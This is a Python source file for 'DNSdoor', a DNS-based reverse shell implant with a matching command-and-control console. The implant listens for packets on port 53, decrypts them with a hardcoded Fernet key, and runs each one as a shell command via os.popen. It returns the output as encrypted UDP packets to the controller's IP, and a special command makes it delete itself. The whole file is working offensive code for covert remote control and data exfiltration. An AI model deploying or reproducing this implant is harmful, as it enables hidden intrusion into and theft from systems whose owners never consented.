#!/usr/bin/env python3

import argparse
import base64
import os
import sys
import time
import warnings
from cryptography.utils import CryptographyDeprecationWarning
warnings.filterwarnings('ignore', category = CryptographyDeprecationWarning)
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from multiprocessing import Process
from scapy.all import *

"""
DNSdoor (DNS reverse shell) [implant]
By stryngs
Inspired by: https://cryptsus.com/blog/icmp-reverse-shell.html
"""

class Dns():
    __slots__ = ('FILTER', 'IP_ID', 'OTP', 'TTL', 'args', 'destination_ip', 'seqCounter', 'svr')
    def __init__(self, args):
        """A class for tracking and encrypting the shell"""
        if args.destination_ip is None:
            self.destination_ip = '192.168.0.100'                               ## CHANGE ME MAYBE
        else:
            self.destination_ip = args.destination_ip
        self.seqCounter = 1
        if args.otp is None:
            self.OTP = Fernet(b'qr0qsfv7AXgw0Iwh4lQ31wZGadH2dZTpqoFydU7wAZw=')  ## CHANGE ME MAYBE
        else:
            self.OTP = Fernet(args.otp.encode())
        self.args = args
        if args.id is None:
            self.IP_ID = 13170                                                  ## CHANGE ME MAYBE
        else:
            self.IP_ID = int(args.id)
        if args.ttl is None:
            self.TTL = 64                                                       ## CHANGE ME MAYBE
        else:
            self.TTL = int(args.ttl)
        if args.mode == 'server':
            self.svr = self.serverShell()
        self.FILTER = 'port 53'

    def LFILTER(self, it):
        """IP address and ICMP ID filtering"""
        def snarf(pkt):
            if pkt[IP].src == it[0]:
                if pkt[IP].id == self.IP_ID:
                    return True
        return snarf

    def clientShell(self):
        """Run commands remotely and return the stdout"""
        def snarf(pkt):
            try:
                if self.args.plaintext is False:
                    ipkt = self.OTP.decrypt(pkt[Raw].load).decode('utf-8', errors = 'ignore')
                else:
                    ipkt = pkt[Raw].load.decode('utf-8', errors = 'ignore')

                if ipkt == '___otp___':
                    if os.path.basename(__file__) == 'otp.py':
                        os.remove('otp.py')
                    sys.exit(0)
                else:
                    payload = os.popen(ipkt).readlines()
            except:
                return False

            try:
                if self.args.plaintext is False:
                    OTP = self.OTP.encrypt('___42___'.join(payload).encode('utf-8'))
                else:
                    OTP = '___42___'.join(payload).encode('utf-8')
                stdout = (IP(dst = pkt[IP].src, ttl = self.TTL, id = self.IP_ID)/\
                          UDP(dport = 53)/\
                          Raw(load = OTP))
                sr(stdout, iface = self.args.interface, timeout = 0, verbose = 0)
                self.seqCounter += 1
            except:
                return False
        return snarf

    def otpGen(self, password):
        """Generate a new key"""
        salt = os.urandom(16)
        kdf = PBKDF2HMAC(algorithm = hashes.SHA256(),
                         length = 32,
                         salt = salt,
                         iterations = 480000)
        return base64.urlsafe_b64encode(kdf.derive(password.encode()))

    def serverShell(self):
        """Show the output from the client"""
        def snarf(pkt):
            try:
                if self.args.plaintext is False:
                    print(self.OTP.decrypt(pkt[Raw].load).decode().replace('___42___', ''))
                else:
                    print(pkt[Raw].load.decode().replace('___42___', ''))
            except:
                return False
        return snarf

    def serverSniff(self):
        """Sniff for the return output from the client"""
        sniff(iface = args.interface,
              prn = self.svr,
              lfilter = self.LFILTER,
              filter = self.FILTER,
              store = 0)

## Only use needed layers
choices = [scapy.layers.l2.ARP,
           scapy.layers.l2.Ether,
           scapy.layers.inet.IP,
           scapy.layers.inet.UDP,
           scapy.packet.Raw]
conf.layers.filter(choices)

if __name__ == '__main__':

    ## Env
    parser = argparse.ArgumentParser()
    parser.add_argument('-d', '--destination_ip',
                        help = 'Destination IP address')
    parser.add_argument('-g', '--generate_key',
                        action = 'store_true',
                        help = 'Generate an encryption key')
    parser.add_argument('-i', '--interface',
                        help = '(Virtual) Network Interface (e.g. eth0)')
    parser.add_argument('-m', '--mode',
                        choices = ['server', 'client'],
                        help = 'server or client mode (client mode is default)')
    parser.add_argument('-o', '--otp',
                        help = 'OTP (Generated via Icmpdoor.otpGen)')
    parser.add_argument('-p', '--plaintext',
                        action = 'store_true',
                        help = 'Plaintext operation')
    parser.add_argument('-t', '--ttl',
                        help = 'IP TTL')
    parser.add_argument('--id',
                        help = 'DNS ID')
    args = parser.parse_args()
    idr = Dns(args)

    ## OTP generation
    if args.generate_key is not False:
        print(idr.otpGen(input('Password?\n')))

    ## Operational modes
    else:

        ## Client mode
        if args.mode is None or args.mode == 'client':
            LFILTER = idr.LFILTER((idr.destination_ip, 8))
            PRN = idr.clientShell()
            print('[+] DNS listener starting!')
            sniff(iface = args.interface,
                  prn = PRN,
                  lfilter = LFILTER,
                  filter = idr.FILTER,
                  store = 0)

        ## Server mode
        else:
            LFILTER = idr.LFILTER((idr.destination_ip, 0))
            sniffing = Process(target = idr.serverSniff)
            sniffing.start()
            print('[+] DNS C2 started!')
            while True:
                icmpshell = input('shell: ')
                if icmpshell == 'exit':
                    print('[+] Stopping DNS C2...')
                    sniffing.terminate()
                    break
                elif icmpshell == '':
                    pass
                else:
                    if args.plaintext is False:
                        OTP = idr.OTP.encrypt(icmpshell.encode())
                    else:
                        OTP = icmpshell.encode()
                    payload = (IP(dst = idr.destination_ip, ttl = idr.TTL, id = idr.IP_ID)/\
                               UDP(dport = 53)/\
                               Raw(load = OTP))
                    sr(payload, iface = args.interface, timeout = 0, verbose = 0)
                    idr.seqCounter += 1

                ## Break the shell
                if icmpshell == '___otp___':
                    print('[+] Deleting DNS C2...')
                    time.sleep(2)
                    sniffing.terminate()
                    break
            sniffing.join()
